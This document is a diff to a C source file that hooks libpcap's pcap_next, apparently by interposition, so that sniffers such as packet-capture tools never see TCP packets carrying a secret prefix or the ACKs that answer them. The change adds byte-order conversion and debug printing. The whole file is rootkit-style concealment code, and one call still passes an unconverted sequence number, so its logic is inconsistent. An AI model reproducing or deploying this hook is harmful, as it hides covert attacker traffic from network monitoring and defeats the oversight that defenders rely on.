@@ -7,6 +7,7 @@
 #include <stdlib.h>
 #include <pcap.h>
 #include <string.h>
+#include <sys/types.h>
 
 #ifndef likely
 #define likely(x)       __builtin_expect(!!(x), 1)
@@ -26,6 +27,10 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
     u_char *payload;
     u_int payload_len;
     struct tcphdr *tcp_hdr;
+    u_int16_t src_port;
+    u_int16_t dst_port;
+    u_int32_t ack_seq;
+
     u_char should_hide = 0;
 
     if (!og_pacp_next)
@@ -44,10 +49,19 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
         // Not TCP
         return packet;
     }
+    src_port = ntohs(tcp_hdr->th_sport);
+    dst_port = ntohs(tcp_hdr->th_dport);
+    ack_seq = ntohl(tcp_hdr->ack_seq);
 
     if (likely(tcp_hdr->ack))
-        if ((should_hide = is_ack_kept(ack_ds_handle, tcp_hdr->th_sport, tcp_hdr->th_dport, tcp_hdr->ack_seq)))
-            remove_ack(&ack_ds_handle, tcp_hdr->th_sport, tcp_hdr->th_dport, tcp_hdr->ack_seq);
+    {
+
+        printf("Looking for %u->%u: %u\n", src_port, dst_port, ack_seq);
+        if ((should_hide = is_ack_kept(ack_ds_handle, src_port, dst_port, ack_seq)))
+        {
+            remove_ack(&ack_ds_handle, src_port, dst_port, ack_seq);
+        }
+    }
 
     if (!(payload = get_tcp_payload(tcp_hdr)))
         goto return_result;
@@ -56,7 +70,8 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
     payload_len = packet + h->len - payload;
     if ((should_hide = (payload_len && strncmp((char *)payload, secret_prefix, sizeof(secret_prefix) - 1) == 0)))
     {
-        add_ack(&ack_ds_handle, tcp_hdr->th_dport, tcp_hdr->th_sport, tcp_hdr->seq + payload_len);
+        add_ack(&ack_ds_handle, dst_port, src_port, tcp_hdr->seq + payload_len);
+        printf("Added HEAD %u->%u: %u\n", dst_port, src_port, ntohl(tcp_hdr->seq) + payload_len);
     }
 
 
